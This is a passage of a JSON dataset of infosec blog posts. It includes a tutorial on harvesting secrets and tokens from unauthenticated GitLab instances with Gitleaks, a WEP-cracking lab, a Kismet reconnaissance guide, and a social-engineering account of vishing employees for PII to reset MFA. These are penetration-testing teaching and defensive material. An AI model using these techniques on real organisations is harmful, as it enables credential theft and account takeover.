\"__main__\":\n main()\n\nIn the get_repos() function, we paginate through all the available repository data 100 items per page at a time until there is no remaining data. This script could (and probably should) take arguments or a config file for portability, but let's bask in the ambiance of hard-coding things, i.e. credentials. Running the code above unauthenticated with updated values for projects_url and unauth_base_url looks something like this: \n\nSearching and Cloning All Available Repositories (Redacted) \n\nGitleaks All the Things \n\nNext, we'll use Gitleaks to scan everything. First, let's clone the project so that we have the gitleaks.toml file, we could download this by itself but, who cares. \n\ngit clone https://github.com/gitleaks/gitleaks.git /opt/gitleaks\n# download gitleaks binary, this assumes you have go installed and set your GOPATH...\n# if not, here's how you can do that.\n# install go..\n# set your GOPATH in ~/.zshrc if you're using Bash, then change as needed to ~/.bash_profile or ~/.bashrc\n\n[[ ! -d \"${HOME}/go\" ]] && mkdir \"${HOME}/go\"\nif [[ -z \"${GOPATH}\" ]]; then\ncat << 'EOF' >> \"${HOME}/.zshrc\"\n\n# Add ~/go/bin to path\n[[ \":$PATH:\" != *\":${HOME}/go/bin:\"* ]] && export PATH=\"${PATH}:${HOME}/go/bin\"\n# Set GOPATH\nif [[ -z \"${GOPATH}\" ]]; then export GOPATH=\"${HOME}/go\"; fi\nEOF\nfi\n\n# now that go is installed, we can install gitleaks binary to our PATH\ngo install github.com/zricethezav/gitleaks/v8@latest\n\nFirst, we'll add an extra rule for extra secrets. This rule is prone to false positives but is worth the extra noise when it catches things that would otherwise have been missed. Add the following to your /opt/gitleaks/config/gitleaks.toml file: \n\n[[rules]]\nid = \"generic-password\"\ndescription = \"Generic Password\"\nregex = '''(?i)password\\s*[:=|>|<=|=>|:]\\s*(?:'|\"|\\x60)([\\w.-]+)(?:'|\"|\\x60)'''\ntags = [\"generic\", \"password\"]\nsecretGroup = 1\n\nTo run Gitleaks against a single repository, you can use syntax such as: \n\n# cd into a cloned repo\ngitleaks detect . -v -r output.json -c /opt/gitleaks/config/gitleaks.toml\n\nBut we're interested in mass testing for this sermon, so we can use another one-off Python script to do just that:\n\n#!/usr/bin/env python3\n\nimport os\nimport subprocess\n\nPWD = os.getcwd()\nGITLEAKS_CONFIG_PATH = \"/opt/gitleaks/config/gitleaks.toml\" # CHANGETHIS if not using /opt/gitleaks/config/gitleaks.toml\n\ndef run_command(command):\n try:\n subprocess.call(command, shell=True)\n except:\n print(\"Error executing command\")\n\ndef find_git_repos():\n repos = []\n for root, dirs, _ in os.walk('.'):\n if '.git' in dirs:\n git_dir = os.path.join(root, '.git')\n repo_dir = os.path.abspath(os.path.join(git_dir, '..'))\n repos.append(repo_dir)\n return repos\n\nrepo_dirs = find_git_repos()\nfor repo_dir in repo_dirs:\n repo_name = os.path.basename(repo_dir)\n if os.path.exists(f\"/root/blog/loot/gitlab/{repo_name}.json\"): # CHANGETHIS if not using /root/bhisblog/loot/gitlab\n project_name = os.path.basename(os.path.dirname(repo_dir))\n repo_name = f\"{project_name}_{repo_name}\"\n os.chdir(repo_dir)\n cmd = f\"gitleaks detect . -v -r /root/blog/loot/gitlab/{repo_name}.json -c {GITLEAKS_CONFIG_PATH}\" # CHANGEME if not using /root/blog/loot/gitlab\n print(cmd)\n run_command(cmd)\n os.chdir(PWD)\n\nThis script will run Gitleaks against each repository and write the resulting secrets to JSON output files. This is all fine and good, but we can do a little better (a lot better would be combining all this logic into a single tool or to fork and implement this feature to an existing tool). Here, we can see Gitleaks doing its thing. \n\nGitleaks Partial Output (Redacted) \n\nCombine All the Things \n\nOkay, so\u2026 Now, what??? Da funk am I supposed to do with all these JSON files? Let's write another program, this time written in Go, to combine all the JSON output files into a single CSV file.  \n\npackage main \n\n \n\nimport ( \n\n \"encoding/csv\" \n\n \"encoding/json\" \n\n \"fmt\" \n\n \"os\" \n\n \"path/filepath\" \n\n) \n\n \n\ntype Item struct { \n\n Description string `json:\"Description\"` \n\n StartLine int `json:\"StartLine\"` \n\n EndLine int `json:\"EndLine\"` \n\n StartColumn int `json:\"StartColumn\"` \n\n EndColumn int `json:\"EndColumn\"` \n\n Match string `json:\"Match\"` \n\n Secret string `json:\"Secret\"` \n\n File string `json:\"File\"` \n\n SymlinkFile string `json:\"SymlinkFile\"` \n\n Commit string `json:\"Commit\"` \n\n Entropy float64 `json:\"Entropy\"` \n\n Author string `json:\"Author\"` \n\n Email string `json:\"Email\"` \n\n Date string `json:\"Date\"` \n\n Message string `json:\"Message\"` \n\n Tags []string `json:\"Tags\"` \n\n RuleID string `json:\"RuleID\"` \n\n Fingerprint string `json:\"Fingerprint\"` \n\n} \n\n \n\nfunc main() { \n\n dirPath := \"/root/work/loot/gitleaks\" // CHANGE ME \n\n csvPath := \"/root/work/loot/all_gitleaks.csv\" // CHANGE ME \n\n \n\n items := make([]Item, 0) \n\n \n\n err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error { \n\n if err != nil { \n\n return err \n\n } \n\n if !info.IsDir() && filepath.Ext(path) == \".json\" { \n\n file, err := os.ReadFile(path) \n\n if err != nil { \n\n return err \n\n } \n\n \n\n var data []Item \n\n err = json.Unmarshal(file, &data) \n\n if err != nil { \n\n fmt.Println(fmt.Errorf(\"error unmarshalling JSON file %s: %s\", path, err)) \n\n } \n\n \n\n items = append(items, data...) \n\n } \n\n return nil \n\n }) \n\n if err != nil { \n\n panic(err) \n\n } \n\n \n\n file, err := os.Create(csvPath) \n\n if err != nil { \n\n panic(err) \n\n } \n\n defer file.Close() \n\n \n\n writer := csv.NewWriter(file) \n\n defer writer.Flush() \n\n \n\n headers := []string{\"Description\", \"StartLine\", \"EndLine\", \"StartColumn\", \"EndColumn\", \"Match\", \"Secret\", \"File\", \"SymlinkFile\", \"Commit\", \"Entropy\", \"Author\", \"Email\", \"Date\", \"Message\", \"Tags\", \"RuleID\", \"Fingerprint\"} \n\n err = writer.Write(headers) \n\n if err != nil { \n\n panic(err) \n\n } \n\n \n\n for _, item := range items { \n\n row := []string{ \n\n item.Description, \n\n fmt.Sprintf(\"%d\", item.StartLine), \n\n fmt.Sprintf(\"%d\", item.EndLine), \n\n fmt.Sprintf(\"%d\", item.StartColumn), \n\n fmt.Sprintf(\"%d\", item.EndColumn), \n\n item.Match, \n\n item.Secret, \n\n item.File, \n\n item.SymlinkFile, \n\n item.Commit, \n\n fmt.Sprintf(\"%f\", item.Entropy), \n\n item.Author, \n\n item.Email, \n\n item.Date, \n\n item.Message, \n\n fmt.Sprintf(\"%v\", item.Tags), \n\n item.RuleID, \n\n item.Fingerprint, \n\n } \n\n err = writer.Write(row) \n\n if err != nil { \n\n panic(err) \n\n } \n\n } \n\n} \n\n[Go Program to Combine JSON Files into a Single CSV File (main.go)]\n\nTo run the go program: \n\ngo run main.go \n\nAgain, each of these one-off scripts and programs could (and should) be integrated into a tool such as Trufflehog, Gitleaks, Noseyparker, or combined to a single standalone script or tool. I'll leave that up to you as an exercise in contributing to open source like a good neighbor should. Breaking each step down into individual scripts initially was the fastest way to prototype the process of plundering GitLab without credentials as an initial proof-of-concept. \n\nAnalyze All the Things \n\nImporting the CSV file via Excel or Libre Open Office as a filter table can greatly assist us in our analysis with the quickness efforts. \n\nExcel Data Import From CSV \n\nThe ability to filter by description or date will do us great justice. \n\nMicrosoft Excel Imported CSV File with Column Filters (Redacted) \n\nIf you're lucky enough to discover a GitLab personal access token that is enabled, you can update the first script with the user_id and personal access token, and run the script a second time. \n\nRemediation, Mitigation, and Prevention \n\nHere is what you can do to make sure this kind of attack doesn't happen to your organization: \n\nRemediation \n\nRemove all sensitive data from source code. \n\nRemove the previous commit(s) in the repository\u2019s history that contained the secret. \n\nIf there are too many offending commits, once the sensitive data is removed from the source code, create a fresh repository and commit the new cleaned code to the new repository. \n\nMitigation \n\nSet all GitLab projects to be private and grant access on an as-needed basis. \n\nThink of \"public\" in terms of GitLab project settings, as meaning open-source. If you wouldn't want the project publicly accessible, set the project to private. \n\nPrevention \n\nImplement Code Scanning CI/CD pipelines using tools such as TruffleHog, GitGuardian, or others. \n\nImplement a pre-commit-hook using tools such as TruffleHog, GitGuardian, or others. \n\nDo not hard-code credentials or sensitive information in public or private project repositories. \n\nEducate developers and DevOps engineers on software development related security best practices. \n\nClosing Thoughts \n\nBe on the lookout for GitLab instances with public projects and API access on your next internal network penetration test! You may be surprised at what you might find ;) I hope this blog post has inspired you to contribute to open-source and to create your own tools. Part of the reason I did not write an open-source GitHub project for this was to draw attention to the logic at each individual step of this process. The same goes for forking an existing tool and making a pull request. I also discovered this tool https://github.com/punk-security/secret-magpie which aims to achieve what we have discussed in this blog post, but again, as far as I could tell by quickly looking through the source code, it didn't look like it supported performing this technique from an unauthenticated context at the time of writing this blog. \n\nResources and References \n\nhttps://github.com/gitleaks/gitleaks \n\nhttps://docs.gitlab.com/ee/user/public_access.html \n\nhttps://docs.gitlab.com/ee/api/projects.html \n\nhttps://github.com/projectdiscovery/nuclei \n\nhttps://github.com/projectdiscovery/nuclei-templates/blob/main/workflows/gitlab-workflow.yaml \n\nhttps://github.com/praetorian-inc/noseyparker \n\nhttps://github.com/punk-security/secret-magpie \n\nhttps://pre-commit.com/ \n\nhttps://github.com/GitGuardian/ggshield-action \n\nFor more information about Trufflehog, see: \n\nhttps://github.com/trufflesecurity/trufflehog \n\nhttps://www.blackhillsinfosec.com/rooting-for-secrets-with-trufflehog/ \n\nhttps://github.com/trufflesecurity/trufflehog?tab=readme-ov-file#trufflehog-gitlab-ci \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Mental Health - An Infosec Challenge\"\nTaxonomies: \"General InfoSec Tips & Tricks, Guest Author, burnout, Mental health\"\nCreation Date: \"Thu, 08 Aug 2024 15:00:00 +0000\"\nby Amanda Berlin of Mental Health Hackers\n\nThis article was originally published in the second edition of the InfoSec Survival Guide. Find it free online HERE or order your $1 physical copy on the Spearphish General Store. \n\nCybersecurity is a rapidly growing field, and with it, comes a number of mental health challenges above and beyond our normal day-to-day living. We are all often under a great deal of stress, as we are responsible for protecting data, environments, and more from attackers, no matter what role we are in. This can lead to burnout, imposter syndrome, high levels of anxiety, and more.\n\nCommon Mental Health Issues in Cybersecurity\n\nBurnout is a state of physical, emotional, and mental exhaustion caused by prolonged stress. One of the reasons we are at risk of burnout is because of the constant bombardment of new threats, attacks, and vulnerabilities. We sometimes feel that we \"always have to be on,\" even to the detriment of our own health. \n\nHigh stress and anxiety are common in the cybersecurity field. Our bodies aren't built to be in a constant \"fight or flight\" mode. \n\nImposter syndrome is a feeling of inadequacy and insecurity, despite evidence to the contrary. We are often surrounded by highly skilled and knowledgeable people; it's one of the amazing aspects of our community, but can also be an indirect source of stress.\n\nImposter Syndrome\n\nTips for Prevention\n\nTake breaks; try not to stare at your screen constantly. Work/life balance is difficult. Overwhelmed or stressed? Go do something else to switch your brain off from work. \n\nExercise is a powerful way to reduce stress and anxiety. It's not just about getting fit, it's also about reconnecting your mind and your body. You don't have to hit the gym \u2014 even a simple, short walk can do wonders. If it's too difficult, start smaller... just start somewhere. \n\nTake care of yourself by speaking to yourself as you would a friend, eating healthy, getting enough sleep, and exercising. This is easier said than done. Start small and work towards achievable goals to establish health habits. (Be kind to yourself. Build trust with yourself that you'll take care of you.)\n\nTalk to someone you trust. It could be a friend or a professional. It may take some patience and persistence to find the right fit, but therapists are professionals that can give you tools to succeed. (Professional therapy isn't the only option. Help can take other forms. Keep seeking out what helps you.)\n\nPlaces to Talk With Fellow Peers\n\nOnline forums: Discord and Slack groups are available in all different areas of security. Many of these have dedicated mental health channels. If you community doesn't have a mental health channel, try asking for one. \n\nScheduled chats with friends: Text, phone, or video, scheduling friend time is sometimes needed amongst our busy daily scheduled.\n\nMental health is an important issue for everyone. Everyone struggles, you're not alone. By being aware of the signs and taking steps to prevent mental health struggles, we all improve our mental health and well-being. \n\nLastly, and most importantly, it's never too late. You can find healing after burnout. You can recover from workplace trauma. Reach out and ask for help. \n\nMore Help\n\nThe National Alliance on Mental Illness (NAMI): nami.orgThe American Foundation for Suicide Prevention (AFSP): afsp.orgMental Health Hackers: mentalhealthhackers.org/resources-and-links/American Psychiatric Association\u2019s Resources for Employers: workplacementalhealth.orgMental Health First Aid: mentalhealthfirstaid.orgSober in Cyber: soberincyber.org/about\n\nIf you find yourself or someone you love in a crisis, you can call 988 for the National Suicide & Crisis Prevention Line. The Lifeline provides 24/7 free and confidential support for people in distress, as well as prevention resources for you and your loved ones. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"WifiForge - WiFi Exploitation for the Classroom\"\nTaxonomies: \"InfoSec 101, Intern, Password Cracking, Red Team, Red Team Tools, Wireless\"\nCreation Date: \"Thu, 01 Aug 2024 15:00:00 +0000\"\nby William Oldert // BHIS Intern\n\nBHIS had a problem.  \n\nWe needed an environment for students to learn WiFi hacking safely. Our original solution used interconnected physical network gear and computers to create the needed signals. The requirement for multiple such setups to properly run a class with was costly, however, and transport was a concern as well.  \n\nWe discovered a program called Mininet, which creates an interactive virtual network, and began looking for ways to utilize it in labs and teaching material. Wondering if this might be the solution we were in sore need of, a project was started, and a team of interns was hired to research and test the limits. \n\nThe product of that project is WifiForge. \n\nWhat is WifiForge? \n\nWifiForge is a program built on the foundation of the open-source Mininet-Wifi, itself being a branch from Mininet that includes support for wireless networking. It automatically sets up the network and tools needed to perform a variety of exploits, all packed neatly into a Docker container. WifiForge eliminates the need for physical hardware, requiring only a docker install and the execution of a couple commands. \n\nYou can find a link to the project's GitHub page HERE.  \n\nDisclaimer/Notes \n\nWhile it is strongly recommended to run WifiForge in a Docker container, you can run it on your base machine. \n\nInstalling Mininet-Wifi on the base machine has been known to cause dependency nightmares. \n\nIt is suggested to run WifiForge on Ubuntu version 14.04 and up or the latest version of Kali (when Mininet was built in 2017, Ubuntu 14.04 was bleeding edge).  \n\nThe WifiForge installation script may disrupt normal operating system use; it is suggested to use a fresh install, virtual machine, or preferably a Docker container. \n\nOS Compatibility \n\nWifiForge should work on any Linux operating system using Docker. The following operating systems have been tested and are confirmed to work. \n\nKali Linux \n\nParrot OS \n\nUbuntu \n\nSet-Up Guide \n\nBelow is the guide to setting up a Docker container with all the required pieces and parts. We have guides for installing to a bare OS or from a Docker image. These instructions can be found on the project's GitHub. The best and easiest option, however, is laid out below. \n\nDocker (recommended) \n\nNote: Dockerfile will fail if Mininet-Wifi is already installed locally \n\nInstall from release \n\nPull the Docker image from Dockerhub and start a new container \n\nsudo docker run --privileged=true -it --env=\"DISPLAY\" --env=\"QT_X11_NO_MITSHM=1\" -v /tmp/.X11-unix:/tmp/.X11-unix:rw -v /sys/:/sys -v /lib/modules/:/lib/modules/ --name mininet-wifi --network=host --hostname mininet-wifi redblackbird/wififorge:v1.0.0 /bin/bash\n\nWithin the container, initiate the controller to simulate APs\n\nservice openvswitch-switch start\n\nRun WifiForge.py\n\nsudo python3 Framework/WifiForge.py\n\nLabs and Featured Tools\n\nWifiForge provides pre-built labs that cover a variety of topics and tools including, but not limited, to:\n\nEaphammer\n\nWPS Networks\n\nWifiphisher\n\nWEP Networks\n\nNetntlm cracking with John\n\nAirgeddon Dos\n\nToday, however, we would like to give you a taste of what this program can do through our WEP key-cracking lab.\n\nLab: WEP Key Cracking\n\nSetup Phase\n\nTo begin, select \u201cWEP Network\u201d from the WifiForge menu and allow up to 30 seconds for initialization of the network.\n\nOnce it has started, use the following command to open an xterm session on the attacker, host1, and host2.\n\nxterm a host1 host2 \n\nWEP Key Cracking\n\nOn the attacking machine, switch the interface to monitor mode using the following command.\n\nairmon-ng start a-wlan0 \n\nSuccessful output of the above command will appear as below.\n\nUse airodump-ng to begin looking for nearby networks.\n\nairodump-ng a-wlan0mon \n\nWait for traffic to appear on the console as seen below.\n\nNote the BSSID and channel before killing the process with 'Ctrl + c'. Use this BSSID and channel in the next command.\n\nairodump-ng \u2013c -\u2013bssid a-wlan0mon \u2013w attack_capture \n\nAs the above command runs, information regarding hosts connected to the target network will appear as seen below.\n\nOn host1, note the IP address associated with host1-wlan0 after running the following command.\n\nifconfig\n\nThe IP address can be seen highlighted in red in the screenshot below.\n\nThe WEP key will be cracked by collecting [JD1] regular user traffic. To simulate this traffic, use the following command on host1.\n\niperf \u2013s\n\nThe above command will begin listening on port 5001 for traffic, as seen below.\n\nSwitch over to host2\u2019s terminal. Run the following command.\n\niperf -c -u -b 100M -t 60\n\nThe above command will begin sending traffic to host1. The output will be similar to the image below.\n\nWait until about 25,000 packets have been sent (see the Frames column in the airmon console). When this number is reached, kill the airmon-ng session on the attacker machine using 'Ctrl + c' and run the following command.\n\naircrack-ng ./attack_capture-01.cap\n\nThe above command will begin attempting to crack the WEP key. Successful decryption will be similar to the screenshot below.\n\nTo Close...\n\nHopefully, this lab helped to demonstrate the usefulness of WifiForge to the reader and showcase what it can be used to accomplish. Being able to spin up an environment for a class, without having to deal with the set up or any of the behind-the-scenes work, is why we built this program. Not having to dink around with hardware is a big plus too. All this in a compact Docker container means portability and scaling are not a problem either.\n\nAnd, of course, WifiForge, as intended, solves BHIS's problem quite handily.\n\nLinks and Further Reading\n\nhttps://github.com/her3ticAVI/Wifi-Forge\n\nhttps://mininet-wifi.github.io/\n\nhttps://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/\n\nhttps://en.wikipedia.org/wiki/IEEE_802.11i-2004\n\nhttps://www.wildwesthackinfest.com\n\nhttps://www.aircrack-ng.org/a\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Ghost in the Wireless: An introduction to Airspace Analysis with Kismet\"\nTaxonomies: \"Cameron Cartier, General InfoSec Tips & Tricks, Informational, InfoSec 101, Recon, Wireless, Kismet, wifi\"\nCreation Date: \"Thu, 15 Aug 2024 15:04:00 +0000\"\n\nThis is the first installment in a series of blogs relating to practical analysis of wireless communications: what they are, how they work, and how they can be attacked. In this post, we are going to walk through setting up the Kismet tool and performing basic analysis of 802.11x traffic. \n\nBackground \n\nThis section provides background on wireless communications and the electromagnetic spectrum. If you simply want instructions on setting up Kismet, skip to the \"Setup\" section. \n\nRather than sending messages via electrical signal going over wires, WIFI, Bluetooth, and other recent technologies utilize waves of various frequencies to transmit information. This transmission relies on digital data being converted into an analogue waveform which will be projected onto the carrier wave using some modulation technique (i.e., Amplitude modulation or Frequency Modulation). The antenna then takes this modulated signal and transmits it out through the airspace. \n\nThe WIFI signals we're talking about today transmit waves in the 2.4GHz and 5.8GHz ranges (\"5G\" operates at a frequency of 5.8GHz). The image below shows approximately where 2.4 GHz WIFI falls on EMF spectrum. \n\nA Diagram Showing the Electromagnetic Spectrum \n\nThe above may be a bit misleading as cellphones and 2.4G wireless, as well as microwave ovens, have some overlap; however, it gets the general idea across. 5G wireless would fall just on the right of microwaves and before infrared remote controls. \n\nThe next section provides a detailed walkthrough on setting up an adapter and software to view these signals. Then we will move on to interpreting and analyzing the data. \n\nEquipment Setup \n\nWe can see many interesting things while monitoring our surrounding airspace including nearby devices, our neighbors SSIDs, and if we're lucky, maybe even capturing some 4-way handshakes. You can follow along from the comfort of your own home, or wherever you'd like, provided you are able to acquire the following items. \n\nYou will need: \n\n1 Machine running Kali Linux (virtual machine is fine) \n\n1 USB WIFI adapter capable of running in monitor mode \n\n1 nerdy friend with a sense of adventure (optional) \n\nOur setup consists of an ARM-64 Kali instance running in VMWare and a USB-C connected ALFA AWUS036ACH WIFI adapter.  \n\nALFA AWUS036ACH \n\nOnce you have your Kali machine up and running, you will need to install drivers for the wireless adapter. If you are using the same wireless adapter mentioned above, the following commands should be sufficient. \n\nsudo apt install dkms \n\ngit clone https://github.com/aircrack-ng/rtl8812au \n \ncd rtl8812au \n \nsudo make dkms_install \n \n# if you get an error about missing kernel headers, install them \n\nsudo apt install linux-headers-6.6.9-arm64 # your version may differ. The error should tell you which version is requested. \n \nmake dkms_install # again, after headers are installed \n \nmake clean # run if the previous command fails \n\nmake \n \nmake install \n\nOnce you have your Kali machine up and running, you will need to install drivers for the wireless adapter. If you are using the same wireless adapter mentioned above, the following commands should be sufficient. \n\nYour machine should now be able to communicate with your wireless adapter. To verify, we can use the utility iwconfig. This utility is used to view and modify parameters of wireless interfaces. In the screenshot below, we only see two interfaces: the loopback, and eth0. This is because we forgot to plug in the adapter. \n\niwconfig Output When No Wireless Devices Present \n\nTo connect the USB adapter to the virtual machine, go to Virtual Machine -> USB & Bluetooth -> Connect Realtek 802.11 NIC as shown in the screenshot below. \n\nNow, we can run iwconfig again, and we see that Kali recognizes a new wireless interface, wlan0. \n\niwconfig Output with Wireless Device Attached \n\nIn the screenshot above it can also be seen that the interface is being managed by NetworkManager, a popular network management service which comes pre-installed and will typically take over your WIFI adapter by default. To snoop the airwaves, we need to put the wireless card in Monitor mode. This can be done by issuing the following commands: \n\n (Note that you will need to change the interface name if yours is not wlan0) \n\nsudo ip link set wlan0 down \nsudo iw dev wlan1 set type monitor \nsudo ip link set wlan0 up\n\nTo verify that we successfully put the device in monitor mode, we can simply run iwconfig one more time. \n\niwconfig showing interface in monitor mode \n\nFinally, we are ready to run Kismet and start exploring. If it is not installed on your machine, you can either download it from the GitHub repo or run sudo apt install Kismet. You can verify the install by running which Kismet or Kismet --version. \n\n(Optional step) Logging data in PCAP-NG format \n\nKismet will save all captured traffic to a Kismet log file.  There are various file types available but, by default, it will only capture the Kismet log. This is fine and can be converted to a PCAP later. However, if you'd like, Kismet to also capture a PCAP file while it\u2019s running, edit the config file as shown below. \n\nWe are going to edit the default configuration file and add PCAP-NG logging. If you installed Kismet via the apt repository, this will be in the location: /etc/Kismet/Kismet_logging.conf\n\nKismet Log File and Relevant Field \n\nYou can also convert Kismet logs to PCAP-NG files after they've been captured using the following command. \n\nKismetdb_to_pcap --in some-Kismet-log.Kismet --out some-pcap-log.pcapng \n\nAirspace Analysis \n\nIt is finally time to launch Kismet. We will be running it with the following command. \n\nKismet -c wlan0 -p ~/log_directory -t output_file \n\nThis tells Kismet we want to use wlan0 as our data source. If you leave this part out, the program will start, but you will not see any traffic in the interface. In theory, one should be able to select the data source from the web interface, however, this has not always been reliable. The -p flag tells Kismet which directory to write the log files to, and the -t determines what the output file will be titled.  \n\nIf you still aren't seeing traffic, try unplugging the adapter and plugging it back in again.  \n\nIf this is your first time logging in, you will be prompted for credentials. Don't forget these! \n\nKismet Credential Prompt\n\nIf you do forget your credentials, they can be found in the ~/.Kismet/Kismet_httpd.conf, where ~ is the home directory of the user who installed Kismet. \n\nData Sources \n\nAs soon as you launch the Web UI, you should see the data start flooding in. Before we look at the data, let's have a quick look at how the data collection is actually working.  Access the Data Sources tab by expanding the hamburger menu on the top right of the interface.  \n\nKismet Menu \n\nThis next screen shows us which network interface is being used, as well as some basic hardware information. The \"Channel Options\" listed underneath show how our wireless adapter is ingesting data from the airspace.   \n\nTo a noob like myself, the \"channels\" label showing all channels highlighted may make it appear as though we are monitoring the entire airspace at once. With current hardware, this is a physical impossibility. Only a single channel can be monitored at any given time. The second highlight in the screenshot below shows that the channel speed is set to 5 channels per second. This means Kismet is listening on a single channel for 1/5 of a second, moving to the next one, and so on. This results in a very useful but incomplete analysis of the spectrum. With this configuration, Kismet is very likely to see new devices, but less likely to capture data such as complete 4-way handshakes since so little time is spent on each channel. \n\nData Source Options in Kismet Interface \n\nYou can change which channel you're interested in by only selecting those.  For example, if you are only interested in data in the 2.4GHz range (WIFI, Bluetooth, Baby Monitors, etc.) You can select channels 1 through 11 and Kismet will hop between these channels only. \n\nReconnaissance \n\nOn the default page, we are looking at a summary of all devices picked up by Kismet. In my case, I am primarily surrounded by WIFI access points, which can be seen in the screenshot below. The AP names and BSSIDs are redacted, as these pieces of information combined with OSINT tools such as WIGLE1 could likely be used to pinpoint my exact physical location. (OSINT is pretty scary) \n\nKismet Interface\n\nIn the next post, when we talk about attacks, data such as the encryption type and number of clients, will be discussed in depth. Here, we will only discuss the two columns highlighted above, each of which can give us some interesting information about the device. \n\nThe signal strength column indicated how close the device is to us. The number represents the power level received by our wireless adapter.  This is useful for tracking down unknown devices, since, as we bring our receiver closer to the unknown device, the signal strength should get stronger. This nerd rendition of Marco-Polo is not infrequently employed on client sites. \n\nIn the same way, if our receiver is not moving, and the signal strength of a device is constantly changing, we can infer that the device is in motion, such as a cellphone or other wireless hotspot. \n\nBut how far are the devices exactly? Signal strength is measured in dBm (decibels per milliwatt) and typically range from 0dBm to -100dBm. The closer the signal is to 0, the closer you are to the transmitting device. However, in practice, the maximum achievable signal strength is about -30dBm. -90 is approaching the noise floor. Though you may pick up the signal, it is unlikely you would be able to interact with the network in any meaningful way. \n\nSignal Strength Visualization \n\nThe channel tells us which frequency the device is operating on. Some devices may show up twice. For example, a WIFI router that transmits both 2.4 and 5G signals will show up twice, because our receiver picks them up as two different signals. \n\nClicking on one of the devices can bring up more information about the device as shown in the screenshot below. \n\nDevice Information for Home WIFI AP\n\nThe BSSID for a device is typically the same as the MAC address, hence why both are redacted in screenshots. The MAC address is what Kismet uses to determine the manufacturer of a device. The first 4-6 digits in the MAC address can typically be used to identify the device vendor. One list of known prefixes can be found on GitHub2 \n\nRecap \n\nYou should now have a solid foundation to jump into more advanced wireless analysis.  We discussed the electromagnetic spectrum, installed Kismet, and captured wireless signals in real-time. Additionally, we demonstrated how this information can be used to identify and locate wireless devices. In future installments, we will cover how to correlate devices, identify rogue access points, and launch some active attacks against PSK networks.  \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Put Yourself Out There - Networking on Social Media\"\nTaxonomies: \"General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Serena DiPenti, InfoSec Survival Guide, Social Media\"\nCreation Date: \"Thu, 05 Sep 2024 15:10:39 +0000\"\n\nIt is no surprise that growing your social network can help get your name out there and provide opportunities to advance your career. LinkedIn, one of the original career-focused networking sites, launched in 2003, making it older than Twitter (or \"X\"), Facebook, and Myspace (by just 2 months). LinkedIn became so popular that it was purchased in 2018 by Microsoft for a cool $26 Billion dollars. Capital B. LinkedIn might be the most popular career-focused networking website, but it's far from the only option. \n\nHowever, career advancement is just one reason people might make content. I started my TikTok account because I was bored. It was a few months into quarantine; I was working from home and spending way too much time scrolling on TikTok. I liked the short form videos, the trends, sounds, and interacting with people who have similar interests. Maybe your motivation is different. \n\nThere are hundreds of blogs on how to get the best read, what time of day you should post, how much you should post, etc. In my experience, it doesn't really matter. \n\nDon't overcomplicate it. You don't need to be an overnight success; you just need to share what you're excited about and the rest will come. \n\nIf you're interested in putting yourself out there, here are some tips:\n\nIdentify your goal: What is your motivation for creating content?\n\nIdentify your preferred medium: Do you prefer writing blogs? Recording videos? Streaming? Podcasting?\n\nPick a platform that supports your preferred medium: Look for platforms specializing in your preferred medium, not just the ability to upload the right file format.\n\nMake the content YOU want: Don't worry about monetization or views. Create based on what you find interesting and would like to share with others. \n\nPost your content: Remember, done is better than perfect. You will improve over time and eventually find what works best for you. \n\nInteract with people: Make friends and keep going. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Perform and Combat Social Engineering\"\nTaxonomies: \"Ashley Knowles, Informational, Phishing, Red Team, Social Engineering\"\nCreation Date: \"Fri, 23 Aug 2024 03:00:00 +0000\"\n\nThis article was originally published in the second edition of the InfoSec Survival Guide. Find it free online HERE or order your $1 physical copy on the Spearphish General Store. \n\nSocial engineering is the use of deceptive tactics and techniques to manipulate users into providing confidential or sensitive information. This information can then be used for nefarious purposes. \n\nPerforming Social Engineering\n\nTypically, our red team assessments start with some way to obtain initial access. This initial access is normally obtained through the use of social engineering, whether that be through Microsoft Teams messages, phishing emails, smishing texts, or vishing calls. There are multiple ways to conduct social engineering and not every way is perfect for every organization. There is a lot of OSINT (Open-Source INTelligent) that goes into the development of the perfect social engineering ruse for an organization. Things like what the company does, what products they use, and even information provided by the client is used to develop and appropriate ruse. \n\nCommonly, successful social engineering ruses are done from the perspective of an IT person calling to discuss a problem with an update that wasn't pushed correctly, or a computer that isn't calling home appropriately. \n\nRecently, a tester posed as HR calling to ensure that employees have had their yearly review. Before continuing with the call, the \"HR representative\" attempted to verify the identity of the person they were calling with the last four of their social, date of birth, and employee number. After verification was completed, the tester proceeded with several generic questions about the review and the employee's experience.\n\nThis ruse proved to be incredibly successful. The tester then called the help desk to claim that they lost their phone which had their password manager on it and needed to join a new phone to their MFA account. With the social-engineered PII (personal identifiable information), the tester was able to join a new phone to their MFA account and reset their password. The compromised account could then be used to access sensitive company data. \n\nIf in doubt, go through other means to verify legitimacy. No reputable person is going to request your password or login information. \n\nCombatting Social Engineering\n\nSo, you may ask, how do we train our employees to recognize and report social engineering attempts? The answer is to always be on guard, have an easy to access and use escalation protocol, and conduct regular social engineering engagements against your team. \n\nThere are a few simple things that, when followed, can protect most users:\n\nAlways check who is sending the email. This can be done by inspecting email headers on suspicious emails.\n\nIf the sender's address does not match who is claiming to be sending the email, report it. \n\nFor text messages or phone calls, the user can use a simple reverse number search on the phone number. Most VoIP phone numbers are suspicious. Threat actors like to use VoIP to hide their dentity and VoIP numbers are easy to obtain. \n\nIf in doubt on whether an email or call/text is malicious, go through other means to contact the actual person to verify legitimacy. \n\nSome questions users can ask themselves that indicate immediate red flags: \n\nWhat is being requested of the user?\n\nIs the user being asked to download software or navigate to a web application?\n\nIs it too good to be true?\n\nAre they being asked for their password, date of birth, last four of their social, or other sensitive information?\n\nIf you think that you are a target of a social engineering attempt, contact the sender via another method. For example, if the caller is claiming to be the company's internal IT, reach out to the IT department directly through a known good number to resolve the issue. \n\nNo reputable person is going to request your password or login information. \n\nWhile social engineering attempts are becoming more advanced, the same general theme applies. With these rules and a proper escalation protocol established internally, you too can fight back against social engineering. \n\n"
    },
    {
        "input": "",
        "instruction": "",
